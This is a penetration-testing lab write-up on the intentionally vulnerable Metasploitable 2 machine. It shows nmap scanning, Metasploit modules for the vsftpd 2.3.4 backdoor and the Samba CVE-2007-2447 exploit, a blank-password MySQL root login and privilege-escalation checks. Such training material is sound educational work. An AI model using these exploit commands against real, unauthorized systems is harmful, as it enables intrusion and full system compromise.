# Metasploitable 2

**Platform:** VulnHub
**OS:** Linux
**Tags:** vsftpd backdoor, Samba, Default Credentials, DVWA, Mutillidae, Multiple CVEs
**Date:** 2026-05-04

Intentionally vulnerable training target. vsftpd backdoor, Samba CVE-2007-2447 RCE, default credentials, and misconfigured web apps across dozens of exploitable services.

## Introduction

Metasploitable 2 is one of the most widely used intentionally vulnerable machines for learning penetration testing. It's not a CTF, it's a training environment packed with real-world misconfigurations and vulnerabilities across dozens of services. This was my second major lab machine after MR. Robot, and it gave me a broad understanding of how different attack surfaces work.

Note: Because this machine is designed for training it contains many obvious vulnerabilities. The goal here is breadth: understanding as many different attack vectors as possible rather than one clean path to root.

## 1. Enumeration

Ran a full aggressive scan. Metasploitable 2 intentionally exposes many services, so a full port scan is essential.

```bash
nmap -sC -sV -A -p- <TARGET_IP>
```

Findings:
- 21/tcp - FTP, vsftpd 2.3.4 (backdoor vulnerability)
- 22/tcp - SSH, OpenSSH 4.7p1
- 23/tcp - Telnet, open with no auth
- 80/tcp - HTTP, XAMPP / DVWA / Mutillidae
- 139/445/tcp - Samba, vulnerable version
- 3306/tcp - MySQL, default credentials
- 5432/tcp - PostgreSQL, default credentials
- 8180/tcp - Apache Tomcat, default manager creds

## 2. Service Exploration

Each service provides a different attack angle. Here are the key ones explored:

### FTP: vsftpd 2.3.4 Backdoor

```
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS <TARGET_IP>
exploit
```

**Root shell via FTP backdoor. Triggered by sending a smiley face in the username.**

### Samba: Username Map Script

```
use exploit/multi/samba/usermap_script
set RHOSTS <TARGET_IP>
exploit
```

**Root shell via Samba command injection (CVE-2007-2447).**

### Web Apps: DVWA and Mutillidae

Both DVWA (Damn Vulnerable Web App) and Mutillidae are installed and accessible on port 80. These provide hands-on practice for SQL injection, XSS, command injection, file inclusion, and more, all within a controlled environment.

```
http://<TARGET_IP>/dvwa
http://<TARGET_IP>/mutillidae
```

### MySQL: Default Credentials

```bash
mysql -u root -h <TARGET_IP>
# Password: (blank)
```

## 3. Initial Access

Multiple entry points available. The cleanest path is the vsftpd backdoor, which gives an immediate root shell without needing to escalate privileges.

Real-world relevance: Default credentials and unpatched software are still the number one way attackers get into real networks. Metasploitable 2 simulates exactly this. These aren't contrived CTF scenarios, they're common misconfiguration patterns.

## 4. Privilege Escalation

Several paths to root depending on your entry point. If starting from a low-privileged shell, common escalation routes on this machine include:

```bash
# Check kernel version for local exploits
uname -a

# Check SUID binaries
find / -perm -u=s -type f 2>/dev/null

# Check sudo permissions
sudo -l

# Check writable cron jobs
cat /etc/crontab
```

**Root achieved via multiple paths. Full system compromise.**

## Key Lessons

- Default credentials are everywhere. Always try them first.
- Outdated software versions have public exploits. Version detection matters.
- A wide attack surface means multiple paths to root: pick the cleanest one.
- Web apps like DVWA are excellent for practising injection techniques in isolation.
